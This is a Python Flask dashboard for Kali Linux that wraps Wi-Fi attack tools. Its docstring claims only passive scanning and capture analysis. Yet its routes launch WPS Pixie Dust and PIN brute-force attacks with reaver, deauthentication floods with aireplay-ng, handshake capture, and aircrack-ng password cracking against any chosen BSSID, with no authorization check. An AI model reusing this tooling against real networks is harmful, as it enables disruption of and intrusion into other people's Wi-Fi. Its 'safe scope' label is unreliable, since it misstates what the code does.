#!/usr/bin/env python3
"""Stryker-style Wi-Fi audit dashboard for Kali Linux.
Safe scope: passive scanning, adapter capability checks, and analysis of existing capture files.
"""
from flask import Flask, render_template, request, redirect, url_for, flash
import subprocess, shutil, re, os, csv, io
from pathlib import Path
from datetime import datetime
from urllib.parse import unquote

app = Flask(__name__)
app.secret_key = os.environ.get("WIFI_AUDIT_SECRET", "change-this-local-secret")
CAPTURE_DIR = Path("captures")
CAPTURE_DIR.mkdir(exist_ok=True)

def run_cmd(args, timeout=15):
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=timeout, check=False)
        return p.returncode, p.stdout.strip(), p.stderr.strip()
    except FileNotFoundError:
        return 127, "", f"Perintah tidak ditemukan: {args[0]}"
    except subprocess.TimeoutExpired:
        return 124, "", "Waktu proses habis."

def has(cmd):
    return shutil.which(cmd) is not None

def interfaces():
    rc, out, err = run_cmd(["iw", "dev"])
    result, current = [], None
    for line in out.splitlines():
        s = line.strip()
        if s.startswith("Interface "):
            current = {"name": s.split(None, 1)[1], "type": "unknown", "phy": ""}
            result.append(current)
        elif current and s.startswith("type "):
            current["type"] = s.split(None, 1)[1]
        elif current and s.startswith("wiphy "):
            current["phy"] = "phy" + s.split(None, 1)[1]
    return result, err if rc else ""

def scan_wifi(iface):
    # Passive/standard scan only; does not deauthenticate or inject frames.
    rc, out, err = run_cmd(["nmcli", "-t", "-f", "IN-USE,SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY",
                            "device", "wifi", "list", "ifname", iface], timeout=25)
    rows = []
    if rc != 0:
        return rows, err or out or "Pemindaian gagal. Periksa NetworkManager dan izin perangkat."
    for line in out.splitlines():
        # nmcli -t uses ':' as separator, but BSSID (MAC) also contains ':'.
        # Format: IN-USE:SSID:BSSID:CHAN:FREQ:SIGNAL:SECURITY
        # BSSID spans parts[2:-4], CHAN=parts[-4], FREQ=parts[-3], SIGNAL=parts[-2], SECURITY=parts[-1]
        parts = line.split(":")
        if len(parts) < 7:
            continue
        inuse = parts[0]
        ssid = parts[1]
        bssid = _normalize_mac(":".join(parts[2:-4]) if len(parts) > 7 else parts[2])
        chan = parts[-4]
        freq = parts[-3]
        signal = parts[-2]
        security = parts[-1]
        rows.append({"inuse": inuse == "*", "ssid": ssid or "(hidden/empty)",
                     "bssid": bssid, "channel": chan, "freq": freq,
                     "signal": signal, "security": security or "Unknown"})
    return rows, ""

TOOL_APT_MAP = {
    "iw": "iw",
    "nmcli": "network-manager",
    "tshark": "wireshark-common",
    "aircrack-ng": "aircrack-ng",
    "reaver": "reaver",
    "bully": "bully",
    "mdk4": "mdk4",
    "hashcat": "hashcat",
    "aireplay-ng": "aireplay-ng",
    "airodump-ng": "aircrack-ng",
}

def installed_tools():
    tools = [
        ("iw", "Info adaptor dan mode Wi-Fi"),
        ("nmcli", "Pemindaian jaringan melalui NetworkManager"),
        ("tshark", "Analisis file capture"),
        ("aircrack-ng", "Pemeriksaan metadata capture yang kompatibel"),
        ("reaver", "WPS audit (pixie dust, pin brute)"),
        ("bully", "WPS audit alternatif"),
        ("mdk4", "Deauth dan stress test"),
        ("hashcat", "PSK brute force"),
        ("aireplay-ng", "Deauth dan inject frame"),
        ("airodump-ng", "Capture handshake dan beacon"),
    ]
    return [{"name": n, "description": d, "installed": has(n), "apt": TOOL_APT_MAP.get(n, n)} for n,d in tools]

@app.route("/")
def index():
    ifaces, err = interfaces()
    return render_template("index.html", ifaces=ifaces, iface_error=err,
                           tools=installed_tools(), capture_files=sorted(
                               [p.name for p in CAPTURE_DIR.iterdir() if p.is_file() and p.suffix.lower() in (".cap", ".pcap", ".pcapng")]),
                           now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

@app.route("/scan", methods=["POST"])
def scan():
    iface = request.form.get("iface", "").strip()
    if not re.fullmatch(r"[A-Za-z0-9_.:-]{1,32}", iface):
        flash("Nama interface tidak valid.", "error")
        return redirect(url_for("index"))
    ifaces, _ = interfaces()
    if iface not in [x["name"] for x in ifaces]:
        flash("Interface tidak ditemukan oleh iw. Sambungkan adaptor yang kompatibel lalu periksa `iw dev`.", "error")
        return redirect(url_for("index"))
    rows, err = scan_wifi(iface)
    return render_template("scan.html", rows=rows, iface=iface, error=err,
                           now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

@app.route("/analyze", methods=["POST"])
def analyze():
    name = request.form.get("capture", "")
    # Only accept a file already placed in captures/, not arbitrary paths.
    if not re.fullmatch(r"[A-Za-z0-9_.-]+\.(?:cap|pcap|pcapng)", name, re.I):
        flash("Nama file capture tidak valid.", "error")
        return redirect(url_for("index"))
    path = (CAPTURE_DIR / name).resolve()
    if path.parent != CAPTURE_DIR.resolve() or not path.is_file():
        flash("File tidak ditemukan. Letakkan file milik Anda di folder captures/.", "error")
        return redirect(url_for("index"))
    result = {"file": name, "size": path.stat().st_size, "frames": "Tidak diketahui",
              "summary": "Analisis metadata; isi paket tidak diubah."}
    if has("capinfos"):
        rc, out, err = run_cmd(["capinfos", str(path)], timeout=20)
        result["details"] = out or err
    elif has("tshark"):
        rc, out, err = run_cmd(["tshark", "-r", str(path), "-q", "-z", "io,phs"], timeout=30)
        result["details"] = out or err
    else:
        result["details"] = "Pasang Wireshark/tshark untuk metadata: sudo apt install wireshark-common"
    if has("tshark"):
        rc, out, err = run_cmd(["tshark", "-r", str(path), "-T", "fields",
                                "-e", "frame.number"], timeout=30)
        if rc == 0:
            result["frames"] = str(len([x for x in out.splitlines() if x.strip()]))
    return render_template("analyze.html", result=result)

@app.route("/install-tool/<tool_name>", methods=["POST"])
def install_tool(tool_name):
    if not re.fullmatch(r"[A-Za-z0-9_-]+", tool_name):
        flash("Nama paket tidak valid.", "error")
        return redirect(url_for("index"))
    pkg = TOOL_APT_MAP.get(tool_name, tool_name)
    rc, out, err = run_cmd(["sudo", "apt-get", "install", "-y", pkg], timeout=180)
    if rc == 0:
        flash(f"{pkg} berhasil diinstal.", "ok")
    else:
        flash(f"Gagal menginstal {pkg}: {err or out}", "error")
    return redirect(url_for("index"))

def _normalize_mac(mac):
    """Bersihkan dan normalisasi MAC address: hilangkan karakter non-hex non-colon,
    pastikan pemisah adalah titik dua, kembalikan huruf besar."""
    if not mac:
        return mac
    # Ambil hanya karakter heksadesimal
    hex_chars = re.findall(r"[0-9A-Fa-f]{2}", mac)
    if len(hex_chars) != 6:
        return mac  # biarkan validasi yang menangani
    return ":".join(hex_chars).upper()

def _validate_iface(iface):
    return bool(re.fullmatch(r"[A-Za-z0-9_.:-]{1,32}", iface))

def _validate_bssid(bssid):
    return bool(re.fullmatch(r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}", bssid))

@app.route("/network/<iface>/<path:bssid>")
def network_detail(iface, bssid):
    # Werkzeug tidak meng-decode percent-encoding (contoh %3A untuk ':') pada
    # nilai converter <path:>, sehingga decode terlebih dahulu sebelum divalidasi.
    iface = unquote(iface)
    bssid = unquote(bssid)
    # Normalisasi BSSID (hapus karakter aneh seperti '/', pastikan pemisah ':')
    bssid = _normalize_mac(bssid)
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter interface atau BSSID tidak valid.", "error")
        return redirect(url_for("index"))
    rows, err = scan_wifi(iface)
    network = next((r for r in rows if r["bssid"].upper() == bssid.upper()), None)
    if not network:
        flash("Jaringan tidak ditemukan pada hasil scan terakhir. Silakan scan ulang terlebih dahulu.", "error")
        return redirect(url_for("index"))
    return render_template("detail.html", iface=iface, network=network,
                           now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

def _attack_run(cmd, label):
    rc, out, err = run_cmd(cmd, timeout=120)
    return render_template("attack_result.html", attack_name=label,
                           output=out or err, rc=rc,
                           now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

@app.route("/attack/wps/pixie-dust", methods=["POST"])
def attack_wps_pixie():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    return _attack_run(["reaver", "-i", iface, "-b", bssid, "-K", "1", "-vv"], "WPS Pixie Dust")

@app.route("/attack/wps/pin-brute", methods=["POST"])
def attack_wps_pin_brute():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    return _attack_run(["reaver", "-i", iface, "-b", bssid, "-vv"], "WPS Pin Brute")

@app.route("/attack/wps/common-pins", methods=["POST"])
def attack_wps_common_pins():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    common = ["12345670", "00005678", "12345678", "99985677", "00000000"]
    outputs = []
    for pin in common:
        rc, out, err = run_cmd(["reaver", "-i", iface, "-b", bssid, "-p", pin, "-vv"], timeout=60)
        outputs.append(f"=== PIN {pin} ===\n{out or err}")
    return render_template("attack_result.html", attack_name="WPS Common Pins",
                           output="\n\n".join(outputs), rc=0,
                           now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

@app.route("/attack/wps/custom-pin", methods=["POST"])
def attack_wps_custom_pin():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    pin = request.form.get("pin", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    if not re.fullmatch(r"[0-9]{8}", pin):
        flash("PIN harus 8 digit angka.", "error")
        return redirect(url_for("index"))
    return _attack_run(["reaver", "-i", iface, "-b", bssid, "-p", pin, "-vv"], f"WPS Custom Pin ({pin})")

@app.route("/attack/wpa/pmk-capture", methods=["POST"])
def attack_wpa_pmk():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    return _attack_run(["tshark", "-i", iface, "-Y", "wlan.rsna", "-a", "duration:30", "-w", "/tmp/pmk_capture.pcap"], "WPA PMK Capture")

@app.route("/attack/wpa/hs-capture", methods=["POST"])
def attack_wpa_hs():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    return _attack_run(["airodump-ng", "--bssid", bssid, "-w", "/tmp/hs_capture", iface], "WPA Handshake Capture")

@app.route("/attack/wpa/deauth", methods=["POST"])
def attack_wpa_deauth():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    return _attack_run(["aireplay-ng", "--deauth", "10", "-a", bssid, iface], "WPA Deauth")

@app.route("/attack/wpa/psk-brute", methods=["POST"])
def attack_wpa_psk_brute():
    iface = request.form.get("iface", "").strip()
    bssid = request.form.get("bssid", "").strip()
    wordlist = request.form.get("wordlist", "").strip()
    capture = request.form.get("capture", "").strip()
    if not _validate_iface(iface) or not _validate_bssid(bssid):
        flash("Parameter tidak valid.", "error")
        return redirect(url_for("index"))
    if not wordlist or not capture:
        flash("Masukkan path wordlist dan file capture.", "error")
        return redirect(url_for("index"))
    return _attack_run(["aircrack-ng", "-w", wordlist, capture], "WPA PSK Brute")

if __name__ == "__main__":
    # Bind only to localhost; do not expose this admin panel to the network.
    app.run(host="127.0.0.1", port=5055, debug=False)
